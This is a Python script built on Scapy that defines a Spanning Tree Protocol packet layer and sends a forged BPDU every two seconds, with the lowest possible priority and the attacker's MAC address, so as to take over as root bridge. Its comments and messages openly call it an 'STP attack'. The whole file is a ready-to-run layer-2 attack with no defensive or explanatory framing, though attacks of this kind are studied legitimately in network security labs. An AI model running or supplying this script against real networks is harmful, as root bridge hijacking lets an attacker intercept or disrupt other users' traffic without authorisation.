from scapy.all import *
from scapy.layers.l2 import Dot3

# Define the STP Layer
class STP(Packet):
    name = "STP"
    fields_desc = [
        ShortField("protocol_id", 0x0000),
        ByteField("version", 0x02),
        ByteField("bpdu_type", 0x00),
        ByteField("flags", 0x00),
        ShortField("root_priority", 0x8000),
        MACField("root_mac", "00:00:00:00:00:00"),
        IntField("root_path_cost", 0),
        ShortField("bridge_priority", 0x8000),
        MACField("bridge_mac", "00:00:00:00:00:00"),
        ShortField("port_id", 0x8001),
        ShortField("message_age", 0x0000),
        ShortField("max_age", 0x1400),
        ShortField("hello_time", 0x0200),
        ShortField("forward_delay", 0x0F00),
    ]

# Bind STP to Dot3 and LLC
bind_layers(Dot3, LLC, dsap=0x42)
bind_layers(LLC, STP, dsap=0x42)

# Configuration
iface = "enp0s3"  # Network interface
attacker_mac = "08:00:27:52:78:05"  # Attacker's MAC address
priority = 0x0001  # Low priority to become Root Bridge
root_id = "00:00:00:00:00:01"  # Forged Root Bridge ID (priority + MAC)
hello_time = 2  # Time between BPDU messages (seconds)

def forge_bpdu():
    """
    Forge a BPDU to become Root Bridge.
    """
    print("[*] Forging BPDU...")
    forged_bpdu = (
        Dot3(src=attacker_mac, dst="01:80:c2:00:00:00") /
        LLC(dsap=0x42, ssap=0x42, ctrl=0x03) /
        STP(
            protocol_id=0x0000,
            version=0x00,
            bpdu_type=0x00,
            flags=0x00,
            root_priority=priority,
            root_mac=attacker_mac,
            root_path_cost=0,
            bridge_priority=priority,
            bridge_mac=attacker_mac,
            port_id=0x8001,
            message_age=0,
            max_age=20 * 256,  # In 1/256th of a second
            hello_time=hello_time * 256,
            forward_delay=15 * 256,
        )
    )
    print("[*] BPDU forged successfully.")
    return forged_bpdu

def send_bpdu_continuously(forged_bpdu):
    """
    Continuously send forged BPDU packets.
    """
    print("[*] Starting BPDU spamming. Press Ctrl+C to stop.")
    try:
        while True:
            sendp(forged_bpdu, iface=iface, verbose=False)
            time.sleep(hello_time)  # Mimic standard BPDU hello time
    except KeyboardInterrupt:
        print("\n[!] Stopping BPDU spamming.")

def main():
    print("[*] Starting STP attack...")
    forged_bpdu = forge_bpdu()
    send_bpdu_continuously(forged_bpdu)
    print("[*] STP attack completed.")

if __name__ == "__main__":
    main()
